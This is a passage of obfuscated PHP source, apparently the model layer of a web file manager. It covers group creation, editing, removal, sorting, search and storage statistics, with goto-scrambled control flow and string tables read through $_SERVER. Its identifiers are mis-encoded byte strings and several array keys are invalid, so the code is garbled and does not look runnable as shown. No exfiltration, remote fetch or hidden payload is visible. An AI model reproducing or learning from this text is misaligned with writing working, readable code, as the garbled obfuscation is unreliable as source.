$this->where($f£Ö•áßŞ®)->select(); if (!$cÄµÎŞŸß¯) { return; } $Eİ©É„Í’ = new Task($B¾”İÊø÷·[2175], $B¾”İÊø÷·[33], count($cÄµÎŞŸß¯)); goto c®¡„–®•; e‡›„´’À: $B¾”İÊø÷· =& $_SERVER[¦·]; $eê‘ÏäÉÜİ = time() - 3600 * 24 * $d…¾ŒºŠëÅ; $f£Ö•áßŞ® = $B¾”İÊø÷·[2174] . $eê‘ÏäÉÜİ; goto eŒ·ªÃ³”„; A ‘¡¼É¨³: } public function resetFile($F×àÇÓ«Ø) { goto f¨ªô÷ñ§; C¼Š“ˆÏƒ: if ($F×àÇÓ«Ø[$d•¸„çˆÏë[2172]] != $Aà§‡«³ì) { $this->where($bââô«ŒĞÇ)->save(array($d•¸„çˆÏë[2168] => $Aà§‡«³ì)); } goto b–¦âª‹ˆ‰; f¨ªô÷ñ§: $d•¸„çˆÏë =& $_SERVER[¦·]; $bââô«ŒĞÇ = array($d•¸„çˆÏë[420] => $F×àÇÓ«Ø[$d•¸„çˆÏë[419]]); $Bíô¡ïå•ä = Model($d•¸„çˆÏë[1122])->where($bââô«ŒĞÇ)->count(); goto b¼¸¸Š‘ØÏ; b¼¸¸Š‘ØÏ: $A¿Öß¦‰§ô = Model($d•¸„çˆÏë[2176])->where($bââô«ŒĞÇ)->count(); $Aà§‡«³ì = intval($Bíô¡ïå•ä) + intval($A¿Öß¦‰§ô); if ($Aà§‡«³ì == 0) { IO::remove($F×àÇÓ«Ø[$d•¸„çˆÏë[75]]); $this->where($bââô«ŒĞÇ)->delete(); $this->metaSet($F×àÇÓ«Ø[$d•¸„çˆÏë[419]], null, null); return; } goto C¼Š“ˆÏƒ; b–¦âª‹ˆ‰: } public function storageInfo($Cœî¤õè— = false) { goto EÆ»¶æå˜Û; BË™ÎÚšˆ·: for ($bÅÍ¼³ĞŠ¢ = 0; $bÅÍ¼³ĞŠ¢ < $aªˆÇØ‹à; $bÅÍ¼³ĞŠ¢ = $bÅÍ¼³ĞŠ¢ + $D‡­çĞ‹Êà) { $E“Ş§÷íê = $this->limit($bÅÍ¼³ĞŠ¢, $bÅÍ¼³ĞŠ¢ + $D‡­çĞ‹Êà)->select(); foreach ($E“Ş§÷íê as $E²¦§ºÌ¹Œ) { $aá»Ì‹Ã¤‹ += $E²¦§ºÌ¹Œ[$AÊØ–šïÍÅ[77]] * $E²¦§ºÌ¹Œ[$AÊØ–šïÍÅ[2172]]; $aëª„¸ã¼ += $E²¦§ºÌ¹Œ[$AÊØ–šïÍÅ[77]] * ($E²¦§ºÌ¹Œ[$AÊØ–šïÍÅ[2172]] - 1); $cˆ×†¢ïÔô += $E²¦§ºÌ¹Œ[$AÊØ–šïÍÅ[2172]]; } } $d‚µ°õÚÆ§ = array($AÊØ–šïÍÅ[2177] => $aá»Ì‹Ã¤‹, $AÊØ–šïÍÅ[2178] => $aëª„¸ã¼, $AÊØ–šïÍÅ[2179] => $aëª„¸ã¼ / $aá»Ì‹Ã¤‹, $AÊØ–šïÍÅ[81] => $aªˆÇØ‹à, $AÊØ–šïÍÅ[2180] => $cˆ×†¢ïÔô); return $d‚µ°õÚÆ§; goto dÀ®–Ãà»‡; EÆ»¶æå˜Û: $AÊØ–šïÍÅ =& $_SERVER[¦·]; $aªˆÇØ‹à = $this->count() + 0.0; $aëª„¸ã¼ = 0; goto EâÎæÆù˜ê; EâÎæÆù˜ê: $aá»Ì‹Ã¤‹ = 1; $cˆ×†¢ïÔô = 0; $D‡­çĞ‹Êà = 5000; goto BË™ÎÚšˆ·; dÀ®–Ãà»‡: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\x6d\145" => "\147\162\157\x75\x70\137\155\x65\164\141", "\x6d\145\x74\x61\106\151\x65\x6c\x64" => "\x67\162\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($aÒ˜ÕÏ÷•é) { $c—Ü”ÒÍˆ´ =& $_SERVER[¦·]; return array($c—Ü”ÒÍˆ´[2181] => array($aÒ˜ÕÏ÷•é[0], $c—Ü”ÒÍˆ´[2182]), $c—Ü”ÒÍˆ´[2183] => array($aÒ˜ÕÏ÷•é[0], $c—Ü”ÒÍˆ´[2182])); } protected function getInfo($B‚…Ü°„‘„) { $B¾¢ˆ‰ãÓ  = $this->getInfoSimple($B‚…Ü°„‘„); if (!$B¾¢ˆ‰ãÓ ) { return !1; } return $this->_listDataApplyItem($B¾¢ˆ‰ãÓ ); } protected function getInfoSimple($b¯„Ê³“ˆ, $F„ŒÇõ¯‚Ê = false) { $FÛäÌ®êÃÁ =& $_SERVER[¦·]; if ($F„ŒÇõ¯‚Ê) { $Eóâ˜¿ğ¬« = array($FÛäÌ®êÃÁ[2112] => intval($b¯„Ê³“ˆ)); $D§İÅøØ‚î = $this->where($Eóâ˜¿ğ¬«)->find(); return is_array($D§İÅøØ‚î) ? $D§İÅøØ‚î : array(); } return $this->cacheFunctionGet($FÛäÌ®êÃÁ[2184], $b¯„Ê³“ˆ); } protected function groupAdd($D¦Â¾¹…¸†) { goto f ›¶¦¸«Ä; EéĞ¤”Ã¡: if (!empty($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]])) { $dÂÈÑ´¹Ïİ[$c¯Ø¿”Èñ»[2112]] = $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]]; } $FõË‡»ƒ­Á = $this->add($dÂÈÑ´¹Ïİ); $this->setNamePinyin($FõË‡»ƒ­Á, $dÂÈÑ´¹Ïİ[$c¯Ø¿”Èñ»[28]]); goto Eí‰·¼Š; eã•¨¦Èë¥: if ($a‘Ù×ÀÕñ¼[$c¯Ø¿”Èñ»[461]]) { $Eß¢ª£÷Õ¡ = $a‘Ù×ÀÕñ¼[$c¯Ø¿”Èñ»[461]] . $a‘Ù×ÀÕñ¼[$c¯Ø¿”Èñ»[2112]] . $c¯Ø¿”Èñ»[47]; } $dÂÈÑ´¹Ïİ = array($c¯Ø¿”Èñ»[386] => $this->groupNameAuto($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[463]], $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[28]]), $c¯Ø¿”Èñ»[368] => $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[463]], $c¯Ø¿”Èñ»[527] => $Eß¢ª£÷Õ¡, $c¯Ø¿”Èñ»[2185] => $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2096]], $c¯Ø¿”Èñ»[2186] => 0, $c¯Ø¿”Èñ»[2116] => 0); if (isset($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2134]])) { $dÂÈÑ´¹Ïİ[$c¯Ø¿”Èñ»[2134]] = $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2134]]; } else { $cÎïÆÖ×‘Î = $this->max($c¯Ø¿”Èñ»[2134]); if (!$cÎïÆÖ×‘Î) { $cÎïÆÖ×‘Î = 0; } $dÂÈÑ´¹Ïİ[$c¯Ø¿”Èñ»[2134]] = $cÎïÆÖ×‘Î + 1; } goto EéĞ¤”Ã¡; Eí‰·¼Š: if (isset($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2187]])) { $this->metaSet($FõË‡»ƒ­Á, array($c¯Ø¿”Èñ»[2187] => $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2187]], $c¯Ø¿”Èñ»[2188] => $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2188]])); unset($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2187]]); unset($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2188]]); } Model($c¯Ø¿”Èñ»[1122])->groupRootAdd($FõË‡»ƒ­Á); return $FõË‡»ƒ­Á; goto böÎîô …â; f ›¶¦¸«Ä: $c¯Ø¿”Èñ» =& $_SERVER[¦·]; if (!$D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[463]] && isset($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]]) && $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]] == 1) { if ($a‘Ù×ÀÕñ¼ = $this->getInfoSimple($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]], !0)) { return $D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[2112]]; } } else { $a‘Ù×ÀÕñ¼ = $this->getInfoSimple($D¦Â¾¹…¸†[$c¯Ø¿”Èñ»[463]]); if (!$a‘Ù×ÀÕñ¼) { return !1; } } $Eß¢ª£÷Õ¡ = $c¯Ø¿”Èñ»[472]; goto eã•¨¦Èë¥; böÎîô …â: } protected function groupEdit($ešÁéä˜¶ƒ, $d´ÎÜøµ°) { $bä•ë‡òæ =& $_SERVER[¦·]; if (!empty($d´ÎÜøµ°[$bä•ë‡òæ[463]])) { $c¤ŒÖ¦òø› = $this->getInfoSimple($ešÁéä˜¶ƒ); $CíÔ¥èÍŒ = $this->getInfoSimple($d´ÎÜøµ°[$bä•ë‡òæ[463]]); if (!$c¤ŒÖ¦òø› || !$CíÔ¥èÍŒ) { return !1; } if ($c¤ŒÖ¦òø›[$bä•ë‡òæ[2112]] == $CíÔ¥èÍŒ[$bä•ë‡òæ[2112]]) { return !1; } if ($d´ÎÜøµ°[$bä•ë‡òæ[463]] != $c¤ŒÖ¦òø›[$bä•ë‡òæ[463]]) { if ($CíÔ¥èÍŒ[$bä•ë‡òæ[461]] !== $c¤ŒÖ¦òø›[$bä•ë‡òæ[461]] && strpos($CíÔ¥èÍŒ[$bä•ë‡òæ[461]], $c¤ŒÖ¦òø›[$bä•ë‡òæ[461]] . $c¤ŒÖ¦òø›[$bä•ë‡òæ[2112]] . $bä•ë‡òæ[47]) === 0) { return !1; } $d´ÎÜøµ°[$bä•ë‡òæ[527]] = $CíÔ¥èÍŒ[$bä•ë‡òæ[461]] . $d´ÎÜøµ°[$bä•ë‡òæ[463]] . $bä•ë‡òæ[47]; $this->_changeChildLevel($c¤ŒÖ¦òø›, $CíÔ¥èÍŒ); } } if (isset($d´ÎÜøµ°[$bä•ë‡òæ[28]])) { $this->setNamePinyin($ešÁéä˜¶ƒ, $d´ÎÜøµ°[$bä•ë‡òæ[28]]); } if (isset($d´ÎÜøµ°[$bä•ë‡òæ[2187]])) { $this->metaSet($ešÁéä˜¶ƒ, array($bä•ë‡òæ[2187] => $d´ÎÜøµ°[$bä•ë‡òæ[2187]], $bä•ë‡òæ[2188] => $d´ÎÜøµ°[$bä•ë‡òæ[2188]])); unset($d´ÎÜøµ°[$bä•ë‡òæ[2187]]); unset($d´ÎÜøµ°[$bä•ë‡òæ[2188]]); } return $this->where(array($bä•ë‡òæ[2189] => $ešÁéä˜¶ƒ))->save($d´ÎÜøµ°); } private function _changeChildLevel($cŞÎÒƒ¹ï¢, $cºî°Û¨, $cÇè—¥¹ƒ² = false) { goto A½¯Æã; EŒÂ¾ä‡Ü¼: if ($cÇè—¥¹ƒ²) { $Bò†Ö¶¬í = $cºî°Û¨[$fÁãä–—í[461]] . $cºî°Û¨[$fÁãä–—í[2112]] . $fÁãä–—í[47]; } $D¨È±ãÉ›  = array($fÁãä–—í[527] => array($fÁãä–—í[485], $cŞÎÒƒ¹ï¢[$fÁãä–—í[461]] . $cŞÎÒƒ¹ï¢[$fÁãä–—í[2112]] . $fÁãä–—í[486])); $dö©æƒ‚¾ = array($fÁãä–—í[527] => array($fÁãä–—í[535], "\162\145\160\x6c\x61\x63\x65\x28\x70\x61\x72\x65\x6e\x74\x4c\145\166\145\x6c\54\47{$cš†Ü¡Ôù‚}\x27\54\47{$Bò†Ö¶¬í}\x27\51")); goto dğøã¨ÇŠã; A½¯Æã: $fÁãä–—í =& $_SERVER[¦·]; $cš†Ü¡Ôù‚ = $cŞÎÒƒ¹ï¢[$fÁãä–—í[461]] . $cŞÎÒƒ¹ï¢[$fÁãä–—í[2112]] . $fÁãä–—í[47]; $Bò†Ö¶¬í = $cºî°Û¨[$fÁãä–—í[461]] . $cºî°Û¨[$fÁãä–—í[2112]] . $fÁãä–—í[47] . $cŞÎÒƒ¹ï¢[$fÁãä–—í[2112]] . $fÁãä–—í[47]; goto EŒÂ¾ä‡Ü¼; dğøã¨ÇŠã: $this->where($D¨È±ãÉ› )->data($dö©æƒ‚¾)->save(); goto a£‰“¼ŒÆ; a£‰“¼ŒÆ: } public function setNamePinyin($F’—¨ĞÆá‰, $B“¼ŸÆ•é„ = false) { $bŠÁ’¯ÆÁ® =& $_SERVER[¦·]; if (!$B“¼ŸÆ•é„) { $eË‘ˆÎÜë‰ = $this->getInfoSimple($F’—¨ĞÆá‰); $B“¼ŸÆ•é„ = $eË‘ˆÎÜë‰[$bŠÁ’¯ÆÁ®[28]]; } if (!Input::check($B“¼ŸÆ•é„, $bŠÁ’¯ÆÁ®[530])) { $this->metaSet($F’—¨ĞÆá‰, $bŠÁ’¯ÆÁ®[416], null); $this->metaSet($F’—¨ĞÆá‰, $bŠÁ’¯ÆÁ®[415], null); return; } $F®„»„—Ûğ = array($bŠÁ’¯ÆÁ®[416] => str_replace($bŠÁ’¯ÆÁ®[50], $bŠÁ’¯ÆÁ®[33], Pinyin::encode($B“¼ŸÆ•é„)), $bŠÁ’¯ÆÁ®[415] => Pinyin::encode($B“¼ŸÆ•é„, $bŠÁ’¯ÆÁ®[531])); $this->metaSet($F’—¨ĞÆá‰, $F®„»„—Ûğ); } protected function groupStatus($fˆÖ¸‰…Ü, $E“»ä×§Ê) { goto eÕØ¸™Ğø¹; c˜ÎóÏ¿êĞ: if ($E“»ä×§Ê == $B‡±³ÙÓù[83]) { $cí¸Ú ùƒ† = $this->parentLevelArray($aœ¬Öçò²ô[$B‡±³ÙÓù[461]]); } else { $a¾¿™æ©Í = array($B‡±³ÙÓù[527] => array($B‡±³ÙÓù[485], $aœ¬Öçò²ô[$B‡±³ÙÓù[461]] . $aœ¬Öçò²ô[$B‡±³ÙÓù[2112]] . $B‡±³ÙÓù[486])); $cí¸Ú ùƒ† = $this->where($a¾¿™æ©Í)->field($B‡±³ÙÓù[2112])->select(); $cí¸Ú ùƒ† = array_to_keyvalue($cí¸Ú ùƒ†, $B‡±³ÙÓù[33], $B‡±³ÙÓù[2112]); } $cí¸Ú ùƒ†[] = $aœ¬Öçò²ô[$B‡±³ÙÓù[2112]]; $BÅ·Å’‘ø¬ = array(); goto d¦†´Åİ³‚; eÕØ¸™Ğø¹: $B‡±³ÙÓù =& $_SERVER[¦·]; $aœ¬Öçò²ô = $this->getInfoSimple($fˆÖ¸‰…Ü); if (!$aœ¬Öçò²ô) { return !1; } goto c˜ÎóÏ¿êĞ; d¦†´Åİ³‚: foreach ($cí¸Ú ùƒ† as $fˆÖ¸‰…Ü) { $BÅ·Å’‘ø¬[] = array($B‡±³ÙÓù[2112] => $fˆÖ¸‰…Ü, $B‡±³ÙÓù[89] => $B‡±³ÙÓù[690], $B‡±³ÙÓù[359] => $E“»ä×§Ê); } return Model($B‡±³ÙÓù[2190])->addAll($BÅ·Å’‘ø¬, array(), !0); goto bâ¥ŒáäÆÎ; bâ¥ŒáäÆÎ: } protected function groupRemove($b•İ´ËÏ®¶) { goto f¡À¢¥öŠÉ; f¡À¢¥öŠÉ: $BÚñßª°¢Ü =& $_SERVER[¦·]; $aµ«ô–í‘Å = array($BÚñßª°¢Ü[2112] => $b•İ´ËÏ®¶); $fÓÂõ™©ò = $this->where($aµ«ô–í‘Å)->find(); goto b¢¨ó æË; b¢¨ó æË: if (!$fÓÂõ™©ò || $fÓÂõ™©ò[$BÚñßª°¢Ü[463]] == 0) { return !1; } $FÇØ¤º·… = $this->getInfoSimple($fÓÂõ™©ò[$BÚñßª°¢Ü[463]]); $this->_changeChildLevel($fÓÂõ™©ò, $FÇØ¤º·…, !0); goto e¦íÜ—…šâ; bç “ÏÖØ²: Model($BÚñßª°¢Ü[753])->groupRootRemove($b•İ´ËÏ®¶); return $this->where($aµ«ô–í‘Å)->delete(); goto a§©ÒÃ—èÓ; e¦íÜ—…šâ: $this->where(array($BÚñßª°¢Ü[463] => $b•İ´ËÏ®¶))->save(array($BÚñßª°¢Ü[463] => $fÓÂõ™©ò[$BÚñßª°¢Ü[463]])); Model($BÚñßª°¢Ü[2190])->where($aµ«ô–í‘Å)->delete(); Model($BÚñßª°¢Ü[2191])->where($aµ«ô–í‘Å)->delete(); goto bç “ÏÖØ²; a§©ÒÃ—èÓ: } protected function groupSort($BõÎñÖÀîâ) { $aòÊèÓ‹Ì¨ =& $_SERVER[¦·]; $Bİ¤âïé‰ = array(); foreach ($BõÎñÖÀîâ as $cø—­‡¶«› => $eŞÎÑª”áï) { $Bİ¤âïé‰[] = array($aòÊèÓ‹Ì¨[2112], $eŞÎÑª”áï, $aòÊèÓ‹Ì¨[2134], $cø—­‡¶«› + 1); } $this->saveAll($Bİ¤âïé‰); } public function listData() { $dœ—«²Œ›Ó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dœ—«²Œ›Ó[$_SERVER[¦·][354]]); return $dœ—«²Œ›Ó; } private function _makeOrder($B¥×Š©é… = '') { goto E°¡¶Â¯Ûƒ; E°¡¶Â¯Ûƒ: $c‡Œó‚†ø =& $_SERVER[¦·]; $Dé³Œ¬ô«’ = array($c‡Œó‚†ø[2112], $c‡Œó‚†ø[28], $c‡Œó‚†ø[2098], $c‡Œó‚†ø[187]); $D®·½Œõ½Ú = array($c‡Œó‚†ø[402] => $c‡Œó‚†ø[403], $c‡Œó‚†ø[404] => $c‡Œó‚†ø[405]); goto cö²Ùñôß…; cö²Ùñôß…: $bôñÖ íÄ = Input::get($c‡Œó‚†ø[407], $c‡Œó‚†ø[7], $c‡Œó‚†ø[2116], $Dé³Œ¬ô«’); $Dğ„³åéŞ® = Input::get($c‡Œó‚†ø[408], $c‡Œó‚†ø[7], $c‡Œó‚†ø[2192], array($c‡Œó‚†ø[2192], $c‡Œó‚†ø[404])); $Dğ„³åéŞ® = $D®·½Œõ½Ú[$Dğ„³åéŞ®]; goto C—›Š†‘‰Õ; C—›Š†‘‰Õ: $B¥×Š©é… = $B¥×Š©é… . "{$bôñÖ íÄ}\40{$Dğ„³åéŞ®}\x2c\x20\x67\162\x6f\165\x70\111\x44\x20\141\x73\143"; return $this->order($B¥×Š©é…); goto AˆŸÇîœáÔ; AˆŸÇîœáÔ: } public function listChild($D¢ˆùëö³ğ) { $eç¸¶Õ™õ =& $_SERVER[¦·]; $FÆ±ÌŒöõ = $this->where(array($eç¸¶Õ™õ[463] => $D¢ˆùëö³ğ))->_makeOrder()->selectPage(200); $this->_listDataApply($FÆ±ÌŒöõ[$eç¸¶Õ™õ[354]]); return $FÆ±ÌŒöõ; } public function listByID($cĞÑä‚”ÆĞ) { $c¥Ÿ”µ£‘ =& $_SERVER[¦·]; if (!$cĞÑä‚”ÆĞ) { return array(); } $eìÄ´ÃÜì™ = array($c¥Ÿ”µ£‘[2112] => array($c¥Ÿ”µ£‘[7], $cĞÑä‚”ÆĞ)); $Bï„¯Æ²õ = $this->where($eìÄ´ÃÜì™)->select(); $this->_listDataApply($Bï„¯Æ²õ); return $Bï„¯Æ²õ; } public function listSearch($bÍ–³¾ÁÂÂ) { goto Dò²±¬ÍÅÌ; b¼©õÖ˜¬: if (!$díª Ğ£ø || count($díª Ğ£ø[$bÂŒçî»¿[354]]) < 5 && Input::check($FÀ¯êØŞÍ‚, $bÂŒçî»¿[306])) { goto fÔ¿è«ßäù; fóâÑ¬Çò: $f©‰”­ÍÙÒ = array_merge($f˜ÎÉâÍ…ñ, $C–àÎÚ‰‹Ä, $díª Ğ£ø[$bÂŒçî»¿[354]]); $díª Ğ£ø[$bÂŒçî»¿[354]] = array_unique_by_key($f©‰”­ÍÙÒ, $bÂŒçî»¿[2112]); $díª Ğ£ø[$bÂŒçî»¿[351]][$bÂŒçî»¿[352]] = count($díª Ğ£ø[$bÂŒçî»¿[354]]); goto a¿˜ª‹È¹‘; fÔ¿è«ßäù: $cáƒ–»æÑĞ = $this->groupChildrenAll($a ë·ˆõÈÃ); $f˜ÎÉâÍ…ñ = $this->_searchFromMeta($bÂŒçî»¿[415], $FÀ¯êØŞÍ‚, 10, $cáƒ–»æÑĞ); $C–àÎÚ‰‹Ä = $this->_searchFromMeta($bÂŒçî»¿[416], $FÀ¯êØŞÍ‚, 10, $cáƒ–»æÑĞ); goto fóâÑ¬Çò; a¿˜ª‹È¹‘: $díª Ğ£ø[$bÂŒçî»¿[351]][$bÂŒçî»¿[353]] = ceil($díª Ğ£ø[$bÂŒçî»¿[351]][$bÂŒçî»¿[352]] / $díª Ğ£ø[$bÂŒçî»¿[351]][$bÂŒçî»¿[349]]); goto f‡ÓÜÀ¢å; f‡ÓÜÀ¢å: } $this->_listDataApply($díª Ğ£ø[$bÂŒçî»¿[354]]); return $díª Ğ£ø; goto C÷Ùµ«ÒöÄ; AÃ¥è‡­: if (!trim($FÀ¯êØŞÍ‚)) { return !1; } $FÀ¯êØŞÍ‚ = str_replace($bÂŒçî»¿[2195], $bÂŒçî»¿[2196], $FÀ¯êØŞÍ‚); $dà—¯¤Å©· = array($bÂŒçî»¿[2112] => array($bÂŒçî»¿[752], "\45{$FÀ¯êØŞÍ‚}\x25"), $bÂŒçî»¿[28] => array($bÂŒçî»¿[752], "\x25{$FÀ¯êØŞÍ‚}\45"), $bÂŒçî»¿[916] => $bÂŒçî»¿[2197]); goto Fá¨¨©ˆâÄ; Fá¨¨©ˆâÄ: if ($a ë·ˆõÈÃ) { $bó²–¾Û  = $this->getInfoSimple($a ë·ˆõÈÃ); $cÚ¢â²Œ¤ = $bó²–¾Û [$bÂŒçî»¿[461]] . $a ë·ˆõÈÃ . $bÂŒçî»¿[486]; $dà—¯¤Å©· = array($dà—¯¤Å©·, array($bÂŒçî»¿[461] => array($bÂŒçî»¿[752], $cÚ¢â²Œ¤))); } $díª Ğ£ø = $this->_makeOrder()->where($dà—¯¤Å©·)->selectPage(20); $díª Ğ£ø = $díª Ğ£ø ? $díª Ğ£ø : array(); goto b¼©õÖ˜¬; Dò²±¬ÍÅÌ: $bÂŒçî»¿ =& $_SERVER[¦·]; $FÀ¯êØŞÍ‚ = $bÍ–³¾ÁÂÂ[$bÂŒçî»¿[2193]]; $a ë·ˆõÈÃ = isset($bÍ–³¾ÁÂÂ[$bÂŒçî»¿[2194]]) ? $bÍ–³¾ÁÂÂ[$bÂŒçî»¿[2194]] : !1; goto AÃ¥è‡­; C÷Ùµ«ÒöÄ: } protected function groupChildrenAll($B×®ªÀÙŠ—) { $Bì¸Èƒá£³ =& $_SERVER[¦·]; if (!$B×®ªÀÙŠ—) { return !1; } if (is_string($B×®ªÀÙŠ—)) { $B×®ªÀÙŠ— = array($B×®ªÀÙŠ—); } $DÍÎË–êà = $B×®ªÀÙŠ—; foreach ($B×®ªÀÙŠ— as $C…½Ò–—‹˜) { $BŒ°ô¡¸¹¯ = $this->getInfoSimple($C…½Ò–—‹˜); $Aç…ƒºÎ É = array($Bì¸Èƒá£³[461] => array($Bì¸Èƒá£³[752], $BŒ°ô¡¸¹¯[$Bì¸Èƒá£³[461]] . $C…½Ò–—‹˜ . $Bì¸Èƒá£³[486])); $f‰¿øÑÈ  = $this->field($Bì¸Èƒá£³[2112])->where($Aç…ƒºÎ É)->select(); $DÍÎË–êà = array_merge($DÍÎË–êà, array_to_keyvalue($f‰¿øÑÈ , $Bì¸Èƒá£³[33], $Bì¸Èƒá£³[2112])); } return array_unique($DÍÎË–êà); } private function _searchFromMeta($AÙ·Ûø˜‡, $eÙ©„ªàÓ™, $F¯¥åäŞ², $b¬‹´‰™æö) { goto CÙ½Îšêñê; AÏÉí¥Ì·î: $A×¡¯÷£®ò = array_to_keyvalue($A×¡¯÷£®ò, $f‡®¯‹·Í¯[33], $f‡®¯‹·Í¯[2112]); $b™ŞË«ÁÓµ = $this->where(array($f‡®¯‹·Í¯[2189] => array($f‡®¯‹·Í¯[7], $A×¡¯÷£®ò)))->select(); if (!$b™ŞË«ÁÓµ) { return array(); } goto C…Ë Á„ù–; CÙ½Îšêñê: $f‡®¯‹·Í¯ =& $_SERVER[¦·]; $eÙ©„ªàÓ™ = strtolower($eÙ©„ªàÓ™); $eÑÜ‘«õ“ = array($f‡®¯‹·Í¯[89] => $AÙ·Ûø˜‡, $f‡®¯‹·Í¯[359] => array($f‡®¯‹·Í¯[752], "\x25{$eÙ©„ªàÓ™}\x25")); goto A¤šƒ¯¤ïï; A¤šƒ¯¤ïï: if ($b¬‹´‰™æö) { $eÑÜ‘«õ“[$f‡®¯‹·Í¯[2112]] = array($f‡®¯‹·Í¯[7], $b¬‹´‰™æö); } $A×¡¯÷£®ò = Model($f‡®¯‹·Í¯[2198])->where($eÑÜ‘«õ“)->limit($F¯¥åäŞ²)->select(); if (!$A×¡¯÷£®ò) { return array(); } goto AÏÉí¥Ì·î; C…Ë Á„ù–: return $b™ŞË«ÁÓµ; goto CëŞ§‰‡ÔŞ; CëŞ§‰‡ÔŞ: } protected function _listDataApplyItem($a×˜¡‘¶ºš) { $e“¾‚ƒêÇÙ = array($a×˜¡‘¶ºš); $this->_listDataApply($e“¾‚ƒêÇÙ); return $e“¾‚ƒêÇÙ[0]; } protected function _listDataApply(&$fŠÌ“À±Î) { goto FßĞ˜ëº·î; E‚ÒÀŒà‚: $this->_listAppendParent($fŠÌ“À±Î); $this->_listAppendSourceRoot($fŠÌ“À±Î, $D•ŸÇ§Ş¿‰); goto D˜Àœ‰†ö; Fäº›ù´¾æ: $this->_listAppendChildren($fŠÌ“À±Î); $this->_listAppendChildrenMember($fŠÌ“À±Î); $this->_listAppendMeta($fŠÌ“À±Î, $D•ŸÇ§Ş¿‰); goto E‚ÒÀŒà‚; FßĞ˜ëº·î: $Eµ£¡¦¶ß½ =& $_SERVER[¦·]; if (!$fŠÌ“À±Î) { return; } $D•ŸÇ§Ş¿‰ = array_to_keyvalue($fŠÌ“À±Î, $Eµ£¡¦¶ß½[33], $Eµ£¡¦¶ß½[2112]); goto Fäº›ù´¾æ; D˜Àœ‰†ö: } private function _listAppendChildren(&$AàŒªÌ£) { goto cí´ÏêÊÌ; cí´ÏêÊÌ: $aÀ‹ùâÈ³ =& $_SERVER[¦·]; $DÚÏ¨“º˜é = $aÀ‹ùâÈ³[361]; $Aà‡ğ®À = array(); goto FóÅ¨ìªÇµ; FóÅ¨ìªÇµ: $aµ¤Ş‰°‹ = count($AàŒªÌ£); $c±ÉÛ§„¾ = $this->tablePrefix . $this->tableName; for ($Eóé¿Œé‰‹ = 0, $a”ŠÇ‹‹ºº = 0; $Eóé¿Œé‰‹ < $aµ¤Ş‰°‹; $Eóé¿Œé‰‹++) { $a”ŠÇ‹‹ºº++; $fÀ¢êÄéİÁ = $AàŒªÌ£[$Eóé¿Œé‰‹][$aÀ‹ùâÈ³[2112]]; $DÚÏ¨“º˜é .= "\x53\105\x4c\x45\x43\x54\40\52\x20\106\122\117\115\x20\x28\123\105\x4c\105\103\x54\40\x27{$fÀ¢êÄéİÁ}\x5f\143\150\x69\x6c\144\x27\40\x61\163\40\150\x61\163\x20\106\x52\117\x4d\x20\140{$c±ÉÛ§„¾}\x60\x20\167\150\145\x72\145\40\x70\141\162\145\156\x74\x49\104\75{$fÀ¢êÄéİÁ}\40\x6c\x69\155\151\x74\x20\61\51\x20\141\163\40\x74\142\x5f{$fÀ¢êÄéİÁ}\40\165\156\x69\x6f\156\x20\141\154\154\x20"; if (($a”ŠÇ‹‹ºº >= 20 || $Eóé¿Œé‰‹ == $aµ¤Ş‰°‹ - 1) && $DÚÏ¨“º˜é) { $DÚÏ¨“º˜é = substr($DÚÏ¨“º˜é, 0, -strlen($aÀ‹ùâÈ³[451])); $aé›Ó“ô¡ = $this->query($DÚÏ¨“º˜é); $Aà‡ğ®À = array_merge($Aà‡ğ®À, $aé›Ó“ô¡); $a”ŠÇ‹‹ºº = 0; $DÚÏ¨“º˜é = $aÀ‹ùâÈ³[33]; } } goto BŒš¬ÖĞÍÁ; BŒš¬ÖĞÍÁ: $Aà‡ğ®À = array_to_keyvalue($Aà‡ğ®À, $aÀ‹ùâÈ³[452]); foreach ($AàŒªÌ£ as &$c•¢‹‹‡´“) { $c•¢‹‹‡´“[$aÀ‹ùâÈ³[2199]] = isset($Aà‡ğ®À[$c•¢‹‹‡´“[$aÀ‹ùâÈ³[2112]] . $aÀ‹ùâÈ³[2200]]); } unset($c•¢‹‹‡´“); goto EÇÇõòØ§; EÇÇõòØ§: } private function _listAppendChildrenMember(&$fÕ¯Ù“ŸøÒ) { goto CÂšÃ™ßì‰; cÔíó¿î˜Ø: $eáØÊñô›Œ = array_to_keyvalue($eáØÊñô›Œ, $f‚ÇŸ¬ŒáÇ[452]); foreach ($fÕ¯Ù“ŸøÒ as &$aÙé‰·º¸) { $aÙé‰·º¸[$f‚ÇŸ¬ŒáÇ[2201]] = isset($eáØÊñô›Œ[$aÙé‰·º¸[$f‚ÇŸ¬ŒáÇ[2112]] . $f‚ÇŸ¬ŒáÇ[2200]]); } unset($aÙé‰·º¸); goto Aô§…ÄªÁ; CÂšÃ™ßì‰: $f‚ÇŸ¬ŒáÇ =& $_SERVER[¦·]; $Fê‹‹ìã¬— = $f‚ÇŸ¬ŒáÇ[361]; $eáØÊñô›Œ = array(); goto F†ÀĞÂÂ÷¯; F†ÀĞÂÂ÷¯: $c©¶ÛÕ¶†ì = count($fÕ¯Ù“ŸøÒ); $D’ÕÖŒä—˜ = $this->tablePrefix . $f‚ÇŸ¬ŒáÇ[2191]; for ($BââªÏêÃï = 0, $A‰ºÀĞâÕ = 0; $BââªÏêÃï < $c©¶ÛÕ¶†ì; $BââªÏêÃï++) { $A‰ºÀĞâÕ++; 